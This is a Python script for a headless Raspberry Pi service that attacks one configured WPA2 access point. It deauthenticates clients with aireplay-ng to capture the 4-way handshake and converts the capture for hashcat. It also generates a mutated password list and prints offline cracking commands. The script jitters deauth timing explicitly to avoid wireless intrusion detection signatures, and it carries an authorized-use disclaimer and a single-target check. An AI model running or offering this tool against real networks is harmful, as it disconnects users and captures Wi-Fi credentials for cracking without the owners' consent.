#!/usr/bin/env python3
"""
wpacrack - autonomous, lockout-safe WPA2 handshake CAPTURE appliance for a single authorized AP.

Design note (why capture-only): a Raspberry Pi is an excellent *capture* box but a poor
*cracking* box - WPA2 is PBKDF2-HMAC-SHA1 x4096, and a Pi CPU manages only a few thousand
guesses/sec (rockyou can take hours). So this tool does the part the Pi is good at - reliably
capturing and validating a 4-way handshake - and hands you a hashcat-ready file to crack on
real hardware (a GPU box: `hashcat -m 22000`). It never cracks on the Pi.

Runs headless as a systemd service (like ngbf/upnpwatch): kick it off, drop the SSH session,
come back to a STATUS/RESULT beacon. Restores the box to a clean managed state on stop/finish.

> Authorized use only. It deauthenticates clients of, and captures the handshake for, the ONE
> AP named in wpacrack.conf. It refuses to start without a configured target BSSID, so it can
> never wander onto a neighbouring network.
"""
import os, sys, time, subprocess, signal, re, glob, traceback, datetime, random

# ---------------- CONFIG ----------------
# Site-specific values are loaded from wpacrack.conf (see wpacrack.conf.example); the conf file
# is gitignored so a lab's real AP identifiers never land in the repo, and the tool refuses to
# run without it. These are inert defaults, overwritten at load.
IFACE        = "wlan1"
ESSID        = ""              # from conf: essid
TARGETS      = []              # from conf: targets = BSSID:CHANNEL,BSSID:CHANNEL
CUSTOM_SEEDS = []              # from conf: custom_seeds (optional) - emitted as a candidate list
                               #            to copy to your cracking box; NOT cracked here

CAPTURE_BUDGET = 2400   # max seconds to hunt a handshake, then give up cleanly
DWELL          = 75     # seconds to sit on each target BSS per cycle

# --- gentle, lockout-safe deauth tuning ---
# IMPORTANT semantics: `aireplay-ng --deauth N` does NOT send N frames. It sends N *rounds*, and
# each round is 64 frames (for a client-targeted burst, 64 to the client AND 64 to the AP = 128).
# So keep the round count minimal. We count ROUNDS, not frames, and show an honest frame estimate.
DEAUTH_ROUNDS      = 1    # rounds per burst (1 = the aireplay minimum; ~64-128 frames, a single nudge)
DEAUTH_ROUND_CAP   = 24   # HARD ceiling on deauth ROUNDS for the whole run, then passive-only
DEAUTH_EVERY       = 20   # base seconds between bursts (jittered) - patient, not a flood
DEAUTH_JITTER      = 8    # +/- seconds, so the timing has no periodic WIDS signature
PASSIVE_FIRST      = 25   # seconds of pure passive listen before ANY deauth (a natural join is free)
FRAMES_PER_ROUND   = 64   # aireplay constant, for the status frame-estimate only

WORK   = "/opt/wpacrack"
CAPS   = WORK + "/caps"
STATUS = WORK + "/STATUS.txt"
RESULT = WORK + "/RESULT.txt"
LOG    = WORK + "/wpacrack.log"
CUSTOM = WORK + "/candidates.txt"    # optional targeted candidate list (deliverable, not used here)
GOOD   = WORK + "/handshake.cap"     # the captured handshake
HASH22 = WORK + "/wpa.22000"         # hashcat-ready (mode 22000), if hcxpcapngtool is available
HOMES  = ["/root", "/home/kali", "/home/kali-pie"]

children = []
_state = {"phase": "init", "detail": "", "started": time.time()}
_cleaned = False
_deauth_rounds = 0   # running total of deauth ROUNDS, enforced against DEAUTH_ROUND_CAP
# ----------------------------------------

CONF_PATHS = [os.path.join(os.path.dirname(os.path.abspath(__file__)), "wpacrack.conf"),
              "/opt/wpacrack/wpacrack.conf"]


def load_config():
    """Load site config from wpacrack.conf (key = value). Refuses to run without a valid
    targets list, so the tool can never deauth a placeholder/other BSSID by accident."""
    global IFACE, ESSID, TARGETS, CUSTOM_SEEDS
    path = next((p for p in CONF_PATHS if os.path.exists(p)), None)
    if not path:
        sys.stderr.write("FATAL: no wpacrack.conf found (copy wpacrack.conf.example and edit).\n")
        sys.exit(2)
    cfg = {}
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            cfg[k.strip().lower()] = v.strip()
    IFACE = cfg.get("iface", IFACE)
    ESSID = cfg.get("essid", "")
    tgs = []
    for tok in cfg.get("targets", "").split(","):
        tok = tok.strip()
        if ":" in tok:
            bssid, _, ch = tok.rpartition(":")
            bssid = bssid.strip()
            if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid) and ch.strip().isdigit():
                tgs.append((bssid.upper(), int(ch)))
    TARGETS = tgs
    CUSTOM_SEEDS = [w.strip() for w in cfg.get("custom_seeds", "").split(",") if w.strip()]
    if not TARGETS:
        sys.stderr.write("FATAL: wpacrack.conf has no valid 'targets = BSSID:CH,...' - refusing to run.\n")
        sys.exit(2)


def now():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def log(msg):
    try:
        with open(LOG, "a") as f:
            f.write(f"[{now()}] {msg}\n")
    except Exception:
        pass


def write_status():
    el = int(time.time() - _state["started"])
    frames = _deauth_rounds * FRAMES_PER_ROUND
    block = (f"wpacrack STATUS @ {now()}\n"
             f"  phase   : {_state['phase']}\n"
             f"  detail  : {_state['detail']}\n"
             f"  elapsed : {el // 60}m{el % 60}s\n"
             f"  deauth  : {_deauth_rounds}/{DEAUTH_ROUND_CAP} rounds (~{frames} frames)\n"
             f"  iface   : {IFACE}   essid: {ESSID}\n")
    try:
        with open(STATUS, "w") as f:
            f.write(block)
    except Exception:
        pass


def set_state(phase=None, detail=None):
    if phase is not None:
        _state["phase"] = phase
    if detail is not None:
        _state["detail"] = detail
    write_status()
    log(f"{_state['phase']}: {_state['detail']}")


def run(cmd, timeout=60, shell=False):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=shell)
    except subprocess.TimeoutExpired as e:
        return e
    except Exception as e:
        log(f"run error {cmd}: {e}")
        return None


def write_result(msg, extra=""):
    body = f"wpacrack RESULT @ {now()}\n{msg}\n{extra}\n"
    try:
        with open(RESULT, "w") as f:
            f.write(body)
    except Exception:
        pass
    for h in HOMES:
        try:
            with open(os.path.join(h, "wpacrack_RESULT.txt"), "w") as f:
                f.write(body)
        except Exception:
            pass
    log("RESULT: " + msg)


# ---------------- interface / NetworkManager ----------------
def netwatch(state):
    run(["/usr/local/bin/netwatch-ctl", state])


def stop_nm():
    run(["systemctl", "stop", "NetworkManager"])
    run(["pkill", "-x", "wpa_supplicant"])
    time.sleep(1)


def start_nm():
    run(["systemctl", "start", "NetworkManager"])
    time.sleep(4)


def set_monitor():
    run(["ip", "link", "set", IFACE, "down"])
    run(["iw", "dev", IFACE, "set", "type", "monitor"])
    run(["ip", "link", "set", IFACE, "up"])


def set_managed():
    run(["ip", "link", "set", IFACE, "down"])
    run(["iw", "dev", IFACE, "set", "type", "managed"])
    run(["ip", "link", "set", IFACE, "up"])


def set_channel(ch):
    run(["iw", "dev", IFACE, "set", "channel", str(ch)])


def kill_children():
    for p in children[:]:
        try:
            p.terminate()
        except Exception:
            pass
    time.sleep(1)
    for p in children[:]:
        try:
            if p.poll() is None:
                p.kill()
        except Exception:
            pass
    children.clear()


# ---------------- capture ----------------
def parse_stations(csv_path, bssid):
    stas = set()
    try:
        with open(csv_path, errors="ignore") as f:
            txt = f.read()
    except Exception:
        return stas
    if "Station MAC" not in txt:
        return stas
    seg = txt.split("Station MAC", 1)[1]
    for line in seg.splitlines()[1:]:
        parts = [x.strip() for x in line.split(",")]
        if len(parts) < 6:
            continue
        mac, assoc = parts[0], parts[5]
        if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac) and assoc.lower() == bssid.lower():
            stas.add(mac)
    return stas


def eapol_ok(cap, bssid):
    """True when the pcap holds EAPOL frames both to and from the AP for a common station
    (a usable 4-way handshake)."""
    r = run(["tshark", "-r", cap, "-n", "-Y", "eapol", "-T", "fields",
             "-e", "wlan.sa", "-e", "wlan.da"], timeout=90)
    if not r or not getattr(r, "stdout", ""):
        return False
    b = bssid.lower()
    frm, to = set(), set()
    for line in r.stdout.splitlines():
        p = line.split("\t")
        if len(p) < 2:
            continue
        sa, da = p[0].lower(), p[1].lower()
        if sa == b:
            frm.add(da)
        if da == b:
            to.add(sa)
    return len(frm & to) > 0


def start_airodump(bssid, ch, prefix):
    for f in glob.glob(prefix + "*"):
        try:
            os.remove(f)
        except Exception:
            pass
    p = subprocess.Popen(
        ["airodump-ng", "--bssid", bssid, "-c", str(ch), "-w", prefix,
         "--output-format", "pcap,csv", IFACE],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    children.append(p)
    return p


def deauth(bssid, stas):
    """Gentle, capped, client-targeted deauth. One minimal round to a single station per call
    (a nudge to re-handshake), never a broadcast flood, and never past DEAUTH_ROUND_CAP rounds.
    With no client visible it sends nothing (a broadcast deauth without a client can't produce a
    handshake and only adds noise) - it waits for passive discovery instead."""
    global _deauth_rounds
    if _deauth_rounds >= DEAUTH_ROUND_CAP or not stas:
        return
    target = sorted(stas)[0]   # one station per call; caller cycles as the station set changes
    run(["aireplay-ng", "--deauth", str(DEAUTH_ROUNDS), "-a", bssid, "-c", target, IFACE], timeout=20)
    _deauth_rounds += DEAUTH_ROUNDS


def capture():
    t0 = time.time()
    cyc = 0
    while time.time() - t0 < CAPTURE_BUDGET:
        cyc += 1
        for bssid, ch in TARGETS:
            if time.time() - t0 >= CAPTURE_BUDGET:
                break
            prefix = f"{CAPS}/hs_{bssid.replace(':', '')}"
            set_channel(ch)
            start_airodump(bssid, ch, prefix)
            # passive-first: a naturally (re)joining client hands us the handshake with zero deauth
            set_state("capture", f"cycle {cyc} {bssid} ch{ch} - passive listen {PASSIVE_FIRST}s")
            pt = time.time()
            while time.time() - pt < PASSIVE_FIRST:
                time.sleep(4)
                for c in glob.glob(prefix + "*.cap"):
                    if eapol_ok(c, bssid):
                        run(["cp", c, GOOD]); kill_children()
                        set_state("captured", f"handshake for {bssid} (passive) -> {GOOD}")
                        return bssid
            dwell0 = time.time()
            while time.time() - dwell0 < DWELL:
                time.sleep(max(4, DEAUTH_EVERY + random.randint(-DEAUTH_JITTER, DEAUTH_JITTER)))
                stas = parse_stations(prefix + "-01.csv", bssid)
                capped = " [cap-reached, passive]" if _deauth_rounds >= DEAUTH_ROUND_CAP else ""
                set_state("capture",
                          f"cycle {cyc} {bssid} ch{ch} - {len(stas)} client(s){capped}")
                deauth(bssid, stas)
                for c in glob.glob(prefix + "*.cap"):
                    if eapol_ok(c, bssid):
                        run(["cp", c, GOOD])
                        kill_children()
                        set_state("captured", f"handshake for {bssid} -> {GOOD}")
                        return bssid
            kill_children()
    return None


# ---------------- convert + deliver (NO cracking on the Pi) ----------------
def gen_candidates():
    """Optional convenience: emit a small targeted candidate list from operator seeds, to copy to
    the cracking box alongside the handshake. Seeds come from wpacrack.conf, never the repo."""
    if not CUSTOM_SEEDS:
        return
    words = set()
    tails = [""] + [str(n) for n in range(0, 100)] + [str(y) for y in range(2015, 2028)] + \
            ["!", "1", "12", "123", "1234", "20", "21", "22", "23", "24", "25", "00", "000"]
    for seed in CUSTOM_SEEDS:
        for b in {seed, seed.lower(), seed.upper(), seed.capitalize()}:
            for t in tails:
                words.add(b + t)
    try:
        with open(CUSTOM, "w") as f:
            f.write("\n".join(sorted(words)) + "\n")
    except Exception:
        pass


def convert_22000(bssid):
    """Convert the captured handshake to hashcat's 22000 format IF hcxpcapngtool is present.
    Returns the hash path on success, else None (the .cap can still be converted on the cracking
    box). Also copies the deliverables to the home dirs for easy pull."""
    made = None
    w = run(["which", "hcxpcapngtool"])
    if w is not None and getattr(w, "returncode", 1) == 0:
        run(["hcxpcapngtool", "-o", HASH22, GOOD], timeout=120)
        if os.path.exists(HASH22) and os.path.getsize(HASH22) > 0:
            made = HASH22
    for src in [GOOD, HASH22, CUSTOM]:
        if os.path.exists(src):
            for h in HOMES:
                run(["cp", src, os.path.join(h, os.path.basename(src))])
    return made


# ---------------- cleanup / signals ----------------
def cleanup():
    """Always restore the box to a clean managed state: managed iface, NetworkManager up,
    netwatch (wlan1 self-heal) re-enabled."""
    global _cleaned
    if _cleaned:
        return
    _cleaned = True
    kill_children()
    try:
        set_managed()
        start_nm()
        netwatch("on")
    except Exception:
        pass


def on_term(signum, frame):
    log(f"signal {signum} - stopping")
    set_state("stopping", "received stop signal")
    cleanup()
    write_result("STOPPED by signal before completion",
                 "Box restored to managed mode. Rerun wpacrack-start to resume.")
    os._exit(0)


# ---------------- main ----------------
def main():
    load_config()
    os.makedirs(CAPS, exist_ok=True)
    signal.signal(signal.SIGTERM, on_term)
    signal.signal(signal.SIGINT, on_term)
    _state["started"] = time.time()
    try:
        open(RESULT, "w").close()
    except Exception:
        pass
    set_state("init", "preflight + monitor mode")
    gen_candidates()
    netwatch("off")
    stop_nm()
    set_monitor()
    set_channel(TARGETS[0][1])
    try:
        bssid = capture()
        if not bssid:
            cleanup()
            write_result("NO HANDSHAKE captured within budget",
                         "Retry when a client of the target AP is powered on and associated "
                         "(a handshake requires a client to (re)join).")
            set_state("done", "no handshake")
            return
        set_state("convert", "validating + converting to hashcat 22000")
        made = convert_22000(bssid)
        cleanup()   # restore the box; the Pi's job is done at capture
        rounds = _deauth_rounds
        frames = rounds * FRAMES_PER_ROUND
        if made:
            nxt = (f"Handshake: {GOOD}\nHash (hashcat mode 22000): {HASH22}\n"
                   f"Also copied to ~/ in {', '.join(HOMES)}.\n"
                   f"Crack it on a GPU box, e.g.:\n"
                   f"  scp kali-pie@pie-kali:{HASH22} .\n"
                   f"  hashcat -m 22000 -a 0 wpa.22000 <wordlist> [-r rules/best64.rule]\n"
                   f"(deauth used: {rounds} rounds ~{frames} frames - no online guessing, no lockout)")
            write_result("SUCCESS - handshake captured + converted (ready to crack off-box)", nxt)
            set_state("done", "handshake + 22000 ready")
        else:
            nxt = (f"Handshake: {GOOD} (also copied to ~/ in the home dirs).\n"
                   f"hcxpcapngtool not found on this host - convert on the cracking box:\n"
                   f"  hcxpcapngtool -o wpa.22000 handshake.cap\n"
                   f"  hashcat -m 22000 -a 0 wpa.22000 <wordlist> [-r rules/best64.rule]\n"
                   f"(deauth used: {rounds} rounds ~{frames} frames - no online guessing, no lockout)")
            write_result("SUCCESS - handshake captured (convert to 22000 off-box)", nxt)
            set_state("done", "handshake ready (no local hcxtools)")
    except Exception:
        tb = traceback.format_exc()
        log("FATAL:\n" + tb)
        cleanup()
        write_result("ERROR - see wpacrack.log", tb[-800:])


if __name__ == "__main__":
    main()
